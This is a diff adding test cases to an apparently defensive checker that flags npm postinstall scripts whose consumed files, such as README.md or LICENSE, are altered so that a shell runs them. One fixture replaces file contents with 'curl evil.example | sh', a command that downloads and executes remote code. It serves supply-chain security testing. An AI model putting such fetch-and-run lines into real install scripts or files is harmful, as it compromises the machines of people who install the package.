@@ -1002,7 +1002,7 @@ describe("round 24: redirects, here-strings, runners as consumers, stdin paths, 
     expect(inert("cat test/x.js > build.js && node build.js", "test/x.js", keep)).toBe(true);
     expect(inert("npx --yes --cal 'sh test/x.sh'")).toBe(true);
     expect(inert("bash --rcfile test/x.sh -i")).toBe(true);
-    expect(held({ postinstall: "node build.js 2>&1 | tee log.txt" }, { "build.js": "1\n", "lib/a.js": "1\n" }, { "build.js": "1\n", "lib/a.js": "1\n", "README.md": "b\n" })).toBe(false);
+    expect(held({ postinstall: "node build.js 2>&1 | tee log.txt" }, { "build.js": "1\n", "lib/a.js": "1\n" }, { "build.js": "1\n", "lib/a.js": "evil()\n" })).toBe(false);
   });
 });
 
@@ -1059,5 +1059,13 @@ describe("round 25: stages with redirects, written files run by path, fed files'
     for (let i = 0; i < 80; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
     scripts.s80 = "npx -c 'node test/x.js'";
     expect(held(scripts, { "test/x.js": "1\n" }, { "test/x.js": "evil()\n" })).toBe(true);
+  });
+});
+
+describe("round 26: inert root-level files fed to a shell", () => {
+  test("1. README.md and CHANGELOG.md", () => {
+    for (const [cmd, f] of [["sh < README.md", "README.md"], [". ./README.md", "README.md"], ["cat README.md | sh", "README.md"], ["cat CHANGELOG.md | sh", "CHANGELOG.md"], ["sh README.md > /dev/null", "README.md"], ["cat LICENSE | bash", "LICENSE"]] as const) {
+      expect(held({ postinstall: cmd }, { [f]: "echo a\n" }, { [f]: "curl evil.example | sh\n" }), cmd).toBe(true);
+    }
   });
 });
